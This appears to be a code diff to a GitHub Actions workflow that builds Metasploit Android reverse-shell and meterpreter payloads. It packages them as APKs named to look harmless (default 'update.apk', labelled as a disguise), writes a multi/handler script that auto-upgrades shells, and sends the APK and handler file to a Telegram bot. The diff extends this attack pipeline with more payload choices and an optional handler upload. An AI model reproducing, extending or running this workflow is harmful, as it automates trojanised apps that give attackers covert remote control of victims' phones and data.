@@ -3,6 +3,22 @@ name: Build MSF Payload
 on:
   workflow_dispatch:
     inputs:
+      payload:
+        description: "Payload type"
+        required: true
+        type: choice
+        default: "android/meterpreter/reverse_tcp"
+        options:
+          - android/meterpreter/reverse_tcp
+          - android/meterpreter/reverse_tcp_ssl
+          - android/meterpreter/reverse_http
+          - android/meterpreter/reverse_https
+          - android/meterpreter_reverse_tcp
+          - android/meterpreter_reverse_http
+          - android/meterpreter_reverse_https
+          - android/shell/reverse_tcp
+          - android/shell/reverse_http
+          - android/shell/reverse_https
       lhost:
         description: "LHOST — public IP/domain your handler listens on"
         required: true
@@ -10,14 +26,15 @@ on:
         description: "LPORT"
         required: true
         default: "4444"
-      payload:
-        description: "msfvenom payload"
-        required: true
-        default: "android/meterpreter/reverse_tcp"
       filename:
         description: "Output APK name (disguise)"
         required: true
         default: "update.apk"
+      send_rc:
+        description: "Also send handler .rc file to Telegram"
+        required: true
+        type: boolean
+        default: true
 
 env:
   IMAGE: "metasploitframework/metasploit-framework:latest"
@@ -31,19 +48,31 @@ jobs:
       - name: Checkout
         uses: actions/checkout@v4
 
-      - name: Resolve parameters
+      - name: Resolve + validate parameters
         id: p
         run: |
           LHOST="${{ github.event.inputs.lhost || secrets.LHOST }}"
-          LPORT="${{ github.event.inputs.lport || secrets.LPORT }}"
+          LPORT="${{ github.event.inputs.lport || secrets.LPORT || '4444' }}"
           PAYLOAD="${{ github.event.inputs.payload || 'android/meterpreter/reverse_tcp' }}"
           FNAME="${{ github.event.inputs.filename || 'update.apk' }}"
-          [ -z "$LHOST" ] && { echo "LHOST missing"; exit 1; }
-          [ -z "$LPORT" ] && LPORT=4444
-          echo "lhost=$LHOST"   >> "$GITHUB_OUTPUT"
-          echo "lport=$LPORT"   >> "$GITHUB_OUTPUT"
+          SEND_RC="${{ github.event.inputs.send_rc || 'true' }}"
+
+          [ -z "$LHOST" ] && { echo "::error::LHOST missing"; exit 1; }
+
+          case "$PAYLOAD" in
+            android/meterpreter/reverse_tcp|android/meterpreter/reverse_tcp_ssl|\
+            android/meterpreter/reverse_http|android/meterpreter/reverse_https|\
+            android/meterpreter_reverse_tcp|android/meterpreter_reverse_http|\
+            android/meterpreter_reverse_https|\
+            android/shell/reverse_tcp|android/shell/reverse_http|android/shell/reverse_https) ;;
+            *) echo "::error::Unsupported payload: $PAYLOAD"; exit 1 ;;
+          esac
+
+          echo "lhost=$LHOST"     >> "$GITHUB_OUTPUT"
+          echo "lport=$LPORT"     >> "$GITHUB_OUTPUT"
           echo "payload=$PAYLOAD" >> "$GITHUB_OUTPUT"
-          echo "fname=$FNAME"   >> "$GITHUB_OUTPUT"
+          echo "fname=$FNAME"     >> "$GITHUB_OUTPUT"
+          echo "send_rc=$SEND_RC" >> "$GITHUB_OUTPUT"
 
       - name: Pull Metasploit image
         run: docker pull "$IMAGE"
@@ -64,22 +93,23 @@ jobs:
       - name: Verify APK
         run: |
           APK="out/${{ steps.p.outputs.fname }}"
-          test -s "$APK" || { echo "APK empty"; exit 1; }
-          unzip -l "$APK" | grep -q AndroidManifest.xml || { echo "Not a valid APK"; exit 1; }
+          test -s "$APK" || { echo "::error::APK empty"; exit 1; }
+          unzip -l "$APK" | grep -q AndroidManifest.xml || { echo "::error::Not a valid APK"; exit 1; }
           echo "APK OK: $(du -h "$APK" | cut -f1)"
 
       - name: Build handler rc
         run: |
-          cat > "out/handler-${{ steps.p.outputs.lport }}.rc" <<EOF
-          use multi/handler
-          set PAYLOAD ${{ steps.p.outputs.payload }}
-          set LHOST ${{ steps.p.outputs.lhost }}
-          set LPORT ${{ steps.p.outputs.lport }}
-          set ExitOnSession false
-          set AutoRunScript post/multi/manage/shell_to_meterpreter
-          exploit -j
-          EOF
-          cat "out/handler-${{ steps.p.outputs.lport }}.rc"
+          RC="out/handler-${{ steps.p.outputs.lport }}.rc"
+          {
+            echo "use multi/handler"
+            echo "set PAYLOAD ${{ steps.p.outputs.payload }}"
+            echo "set LHOST ${{ steps.p.outputs.lhost }}"
+            echo "set LPORT ${{ steps.p.outputs.lport }}"
+            echo "set ExitOnSession false"
+            echo "set AutoRunScript post/multi/manage/shell_to_meterpreter"
+            echo "exploit -j"
+          } > "$RC"
+          cat "$RC"
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
@@ -105,7 +135,9 @@ jobs:
             -F "document=@${APK};type=application/vnd.android.package-archive" \
             "https://api.telegram.org/bot${TG_TOKEN}/sendDocument"
 
-          curl -sS --fail-with-body \
-            -F "chat_id=${TG_CHAT}" \
-            -F "document=@${RC}" \
-            "https://api.telegram.org/bot${TG_TOKEN}/sendDocument"
+          if [ "${{ steps.p.outputs.send_rc }}" = "true" ]; then
+            curl -sS --fail-with-body \
+              -F "chat_id=${TG_CHAT}" \
+              -F "document=@${RC}" \
+              "https://api.telegram.org/bot${TG_TOKEN}/sendDocument"
+          fi
